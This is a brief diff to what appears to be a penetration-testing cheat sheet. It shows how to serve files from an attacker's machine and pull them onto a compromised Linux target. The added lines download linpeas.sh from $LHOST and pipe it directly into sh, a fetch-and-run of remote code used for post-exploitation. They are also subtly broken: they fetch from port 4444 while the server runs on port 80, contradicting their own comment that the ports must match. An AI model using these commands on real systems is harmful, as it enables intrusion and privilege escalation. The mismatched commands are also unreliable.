@@ -299,7 +299,9 @@ stty rows 38 cols 190
 ```bash
 # on your box: serve the folder
 python3 -m http.server 80
-# on target (Linux)
+# on target (Linux) - the fetch port must match the port you served on
+wget http://$LHOST:4444/linpeas.sh -O /tmp/linpeas.sh   # then: chmod +x && run
+curl -s http://$LHOST:4444/linpeas.sh | sh              # nothing writable? pipe it
 wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
 curl http://$LHOST/x -o /tmp/x
 # on target (Windows)
